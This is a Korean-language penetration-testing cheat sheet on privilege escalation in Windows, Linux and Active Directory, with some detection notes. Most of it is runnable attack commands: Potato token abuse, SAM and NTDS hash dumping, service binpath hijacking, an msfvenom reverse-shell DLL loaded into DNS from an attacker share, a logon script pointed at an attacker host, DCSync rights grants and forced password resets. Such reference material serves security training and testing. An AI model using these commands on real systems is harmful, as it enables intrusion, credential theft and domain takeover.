# 권한 상승

현재 권한보다 높은 권한을 획득하는 단계.

로컬 호스트 권한 상승(SYSTEM/root)과 네트워크 권한 상승(Domain Admin) 모두 포함한다.
상황에 따라 로컬 권한 상승이 반드시 필요하지 않을 수 있다. 다른 호스트로 횡적 이동 후 AD 기반 공격으로 Domain Admin을 획득하는 경로도 존재한다.

---

## Windows 권한 상승

### 권한 확인

```powershell
whoami /priv
whoami /groups
```

### Token Privileges 악용

| 권한 | 공격 방법 |
|------|-----------|
| SeImpersonatePrivilege | Potato 계열 (JuicyPotato, PrintSpoofer, GodPotato) |
| SeBackupPrivilege | SAM/SYSTEM 레지스트리 덤프, NTDS.dit 복사 |
| SeRestorePrivilege | 시스템 파일 덮어쓰기 |
| SeDebugPrivilege | 프로세스 메모리 접근 (lsass 덤프) |
| SeTakeOwnershipPrivilege | 파일/레지스트리 소유권 획득 |
| SeLoadDriverPrivilege | 취약한 드라이버 로드 |

```bash
# PrintSpoofer (SeImpersonatePrivilege)
PrintSpoofer.exe -i -c cmd

# GodPotato (최신 Windows 10/11 및 Server 2019/2022에서 동작)
GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotatoNG (차세대 DCOM 기반 token 위장)
JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c whoami"

# RoguePotato (DCOM 원격 활성화를 이용한 token 위장, 특정 환경에서 JuicyPotato 대체재)
RoguePotato.exe -r <attacker_ip> -c "<clsid>" -e "cmd.exe"

# PetitPotam (MS-EFSRPC를 이용한 강제 인증 유도 후 릴레이/위장에 활용)
# 별도 NTLM 릴레이 서버 필요
python3 PetitPotam.py -u <user> -p <pass> -d <domain> <listener_ip> <dc_ip>
```

!!! warning "탐지"
    Potato 계열: Sysmon Event 1 (프로세스 생성 - 특이 경로/인자), Event 7045 (서비스 설치). SYSTEM 권한 프로세스에서 비정상 자식 프로세스 체인 모니터링.

### SeBackupPrivilege

```powershell
# SAM, SYSTEM 레지스트리 덤프
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
```

```bash
# 공격자 호스트에서 해시 추출
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

### 서비스 악용

```powershell
# 약한 서비스 권한 확인 (accesschk)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv <user> <service>

# 서비스 바이너리 경로 변경
sc config <service> binpath= "C:\Windows\Temp\shell.exe"
sc stop <service>
sc start <service>

# Unquoted Service Path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
```

!!! warning "탐지"
    서비스 바이너리 경로 변경: Event 7045 (신규 서비스), Event 4697. `sc config` 실행 시 Sysmon Event 1에서 `binpath` 변경 감지.

### 그룹 기반 권한 상승

| 그룹 | 공격 방법 |
|------|-----------|
| Server Operators | 서비스 생성/수정 가능 → SYSTEM 권한 획득 |
| Backup Operators | SAM/NTDS.dit 백업 가능 |
| DnsAdmins | DNS 서비스에 DLL 로드 |
| Account Operators | 대부분의 계정 관리 가능 |

**Server Operators:**

```powershell
# 기존 서비스 바이너리 경로 변경 → SYSTEM 권한 획득
sc config VSS binpath= "C:\temp\shell.exe"
sc stop VSS
sc start VSS
```

**Backup Operators:**

```powershell
# SeBackupPrivilege로 보호된 파일 복사
# reg save를 이용한 SAM/SYSTEM 추출
reg save HKLM\SAM C:\temp\sam.bak
reg save HKLM\SYSTEM C:\temp\system.bak

# diskshadow로 NTDS.dit 복사 (DC에서)
# 이후 impacket-secretsdump로 해시 추출
```

**DnsAdmins:**

```powershell
# 악성 DLL 생성
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f dll -o dns.dll

# DNS 서비스에 DLL 로드 설정 (SMB 공유에서)
dnscmd DC_HOSTNAME /config /serverlevelplugindll \\ATTACKER\share\dns.dll

# DNS 서비스 재시작 → SYSTEM 권한으로 DLL 실행
sc \\DC_HOSTNAME stop dns
sc \\DC_HOSTNAME start dns
```

**Account Operators:**

```powershell
# 보호되지 않은 그룹에 사용자 추가 (Domain Admins 등 내장 보호 그룹 제외)
net group "Exchange Windows Permissions" attacker_user /add /domain

# 이후 해당 그룹의 권한으로 추가 공격 가능 (예: WriteDACL → DCSync)
```

### 자동화 도구

```bash
# WinPEAS
.\winPEASx64.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all
```

---

## Linux 권한 상승

### SUID/SGID

```bash
# SUID 바이너리 검색
find / -perm -4000 -type f 2>/dev/null

# SGID 바이너리 검색
find / -perm -2000 -type f 2>/dev/null
```

활용 방법은 [GTFOBins](https://gtfobins.github.io/)에서 해당 바이너리를 검색한다.

### Sudo

```bash
# sudo 권한 확인
sudo -l

# (ALL) NOPASSWD 항목이 있으면 해당 바이너리 악용
# 예: sudo /usr/bin/vim → :!sh
```

### Cron Jobs

```bash
# 현재 사용자의 cron
crontab -l

# 시스템 cron
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# 쓰기 가능한 cron 스크립트를 reverse shell로 변경
```

### Capabilities

```bash
# capability가 설정된 바이너리 검색
getcap -r / 2>/dev/null

# 예: cap_setuid가 설정된 python3
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 기타 악용 가능 capability 예시:
# cap_dac_read_search (모든 파일 읽기)
# /path/to/tar -cvf /tmp/x.tar /etc/shadow
#
# cap_sys_admin, cap_sys_ptrace, cap_sys_module (커널 모듈 삽입)
```

### Kernel Exploit

```bash
# 커널 버전 확인
uname -r

# exploit 검색
searchsploit linux kernel <version>
```

### 자동화 도구

```bash
# LinPEAS (종합 체크)
./linpeas.sh

# LinEnum (기초 점검)
./LinEnum.sh

# linux-exploit-suggester (커널 취약점 기반 제안)
./linux-exploit-suggester.sh

# pspy (크론/백그라운드 프로세스 실시간 모니터링)
./pspy64

# SUID3NUM (SUID/SGID 바이너리 자동 탐지 및 GTFOBins 매칭)
python3 suid3num.py
```

---

## AD 권한 상승

AD 환경에서의 권한 상승은 로컬 권한 상승과 별개로, 도메인 수준의 권한을 획득하는 것을 목표로 한다.

### ACL 악용

BloodHound에서 확인된 ACL 관계를 기반으로 공격 경로를 찾는다.

| 권한 | 가능한 행동 |
|------|------------|
| GenericAll | 대상 객체에 대한 모든 제어 (패스워드 변경, 그룹 추가 등) |
| GenericWrite | 속성 변경 (SPN 추가 → Kerberoasting, msDS-KeyCredentialLink 등) |
| WriteDACL | ACL 수정 (자신에게 GenericAll 등 권한 부여) |
| WriteOwner | 소유자 변경 → 이후 WriteDACL로 ACL 수정 가능 |
| ForceChangePassword | 패스워드 강제 변경 (현재 패스워드 몰라도 가능) |
| AddMember | 그룹에 멤버 추가 |
| AllExtendedRights | 패스워드 변경, LAPS 읽기 등 확장 권한 |
| Owns | 오브젝트 소유자 → WriteDACL과 동일한 효과 |

### GenericAll 악용

대상 객체에 대한 완전한 제어 권한. 사용자, 그룹, 컴퓨터 객체에 따라 공격 방식이 다르다.

```bash
# 사용자 객체 - 패스워드 변경
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  set password <target_user> '<new_pass>'

# 사용자 객체 - Targeted Kerberoasting (SPN 추가 후 해시 획득)
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  set object <target_user> servicePrincipalName -v 'HTTP/fake.domain.local'
impacket-GetUserSPNs '<domain>/<user>:<pass>' -dc-ip <dc_ip> -request -outputfile kerberoast.txt

# 그룹 객체 - 멤버 추가
bloodyAD -u '<user>' -p '<pass>' -d <domain> --host <dc_ip> \
  add groupMember '<group>' '<user>'

# net rpc로 그룹 멤버 추가
net rpc group addmem "<group>" "<user>" \
  -U "<domain>/<user>%<pass>" -S <dc_ip>

# 컴퓨터 객체 - RBCD (Resource-Based Constrained Delegation)
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  add rbcd <target_computer> <controlled_computer>
```

### GenericWrite 악용

대상 객체의 속성을 수정할 수 있다. 주로 Targeted Kerberoasting이나 Shadow Credentials에 사용한다.

```bash
# Targeted Kerberoasting - SPN 추가
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  set object <target_user> servicePrincipalName -v 'HTTP/fake.domain.local'

# SPN 제거 (정리)
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  set object <target_user> servicePrincipalName

# Shadow Credentials - msDS-KeyCredentialLink 수정
certipy shadow auto -username <user>@<domain> -password '<pass>' -account <target>

# Script Path 수정 (로그온 스크립트)
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  set object <target_user> scriptPath -v '\\attacker_ip\share\shell.bat'
```

### WriteDACL 악용

대상 객체의 ACL을 수정할 수 있다. 자신에게 GenericAll 등의 권한을 부여한 후 공격을 진행한다.

```bash
# bloodyAD - GenericAll 권한 부여
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  add genericAll <target_object> <user>

# impacket dacledit - DCSync 권한 부여 (도메인 객체 대상)
impacket-dacledit -action 'write' -rights 'DCSync' \
  -principal '<user>' -target-dn 'DC=<domain>,DC=<tld>' \
  '<domain>/<user>:<pass>' -dc-ip <dc_ip>

# 권한 부여 후 DCSync 실행
impacket-secretsdump '<domain>/<user>:<pass>@<dc_ip>'

# ACL 수정 확인
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  get object <target_object> --attr nTSecurityDescriptor
```

### WriteOwner 악용

대상 객체의 소유자를 변경한다. 소유자가 되면 WriteDACL 권한이 자동으로 부여된다.

```bash
# bloodyAD - 소유자 변경
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  set owner <target_object> <user>

# impacket owneredit
impacket-owneredit -action write -new-owner '<user>' \
  -target '<target_object>' '<domain>/<user>:<pass>' -dc-ip <dc_ip>

# 소유자 변경 후 → WriteDACL → GenericAll 순서로 진행
```

### ForceChangePassword 악용

대상 사용자의 패스워드를 현재 패스워드를 모르는 상태에서 강제 변경할 수 있다.

```bash
# bloodyAD
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  set password <target_user> '<new_pass>'

# rpcclient
rpcclient -U "<domain>/<user>%<pass>" <dc_ip> \
  -c 'setuserinfo2 <target_user> 23 <new_pass>'

# net rpc
net rpc password <target_user> '<new_pass>' \
  -U "<domain>/<user>%<pass>" -S <dc_ip>

# impacket-changepasswd
impacket-changepasswd '<domain>/<target_user>@<dc_ip>' \
  -newpass '<new_pass>' -altuser '<user>' -altpass '<pass>'
```

### AddMember 악용

특정 그룹에 멤버를 추가할 수 있다. 주로 Domain Admins, Exchange Windows Permissions 등의 권한 있는 그룹에 추가한다.

```bash
# bloodyAD
bloodyAD -u '<user>' -p '<pass>' -d <domain> --host <dc_ip> \
  add groupMember '<group>' '<target_user>'

# net rpc
net rpc group addmem "<group>" "<target_user>" \
  -U "<domain>/<user>%<pass>" -S <dc_ip>

# 그룹 멤버 확인
net rpc group members "<group>" -U "<domain>/<user>%<pass>" -S <dc_ip>
```

### AllExtendedRights 악용

확장 권한으로, 패스워드 변경과 LAPS 패스워드 읽기 등이 가능하다.

```bash
# LAPS 패스워드 읽기
nxc ldap <dc_ip> -u '<user>' -p '<pass>' -M laps

# bloodyAD로 LAPS 읽기
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
  get object <computer> --attr ms-MCS-AdmPwd

# 패스워드 변경은 ForceChangePassword와 동일하게 진행
```

### DACL 공격 체인 예시

BloodHound에서 발견되는 일반적인 공격 체인:

```text
공격자 -[WriteOwner]→ Group
  → Group 소유자 변경
    → Group에 WriteDACL 획득 (소유자 자동)
      → Group에 AddMember 권한 부여
        → Group에 자신 추가
          → Domain Admin 권한 획득
```

```text
공격자 -[GenericWrite]→ User
  → SPN 추가 (Targeted Kerberoasting)
    → 해시 크래킹
      → 해당 사용자로 접근
```

```text
공격자 -[WriteDACL]→ Domain Object
  → DCSync 권한 부여
    → secretsdump로 전체 해시 덤프
      → Domain Admin으로 인증
```

### Shadow Credentials

대상 계정의 msDS-KeyCredentialLink 속성에 credential을 추가하여 PKINIT으로 TGT를 획득하는 기법.

```bash
# certipy shadow auto: credential 추가 → TGT 획득 → NTLM 해시 추출
certipy shadow auto -username <user>@<domain> -password '<pass>' -account <target>
```

### MS14-068 (Kerberos PAC Forgery)

Windows Server 2008 R2 이하에서 Kerberos PAC를 위조하여 Domain Admin 권한을 획득하는 취약점.

```bash
# GoldenPac (MS14-068 + PSExec)
impacket-goldenPac '<domain>/<user>:<pass>@<dc_fqdn>'
```

이 취약점은 2014년에 패치되었으나 패치되지 않은 서버에서는 여전히 유효하다.

---

!!! info "관련 페이지"
    - ACL 기반 권한 상승 → [AD 환경 공격](../ad/ad-environment.md) (DACL 남용)
    - ADCS 권한 상승 (ESC 공격) → [ADCS 공격](../ad/adcs.md)
    - Delegation 공격 → [AD 환경 공격](../ad/ad-environment.md) (Kerberos Delegation)
    - Linux 권한 상승 도구 → [도구 레퍼런스](../tools/index.md)
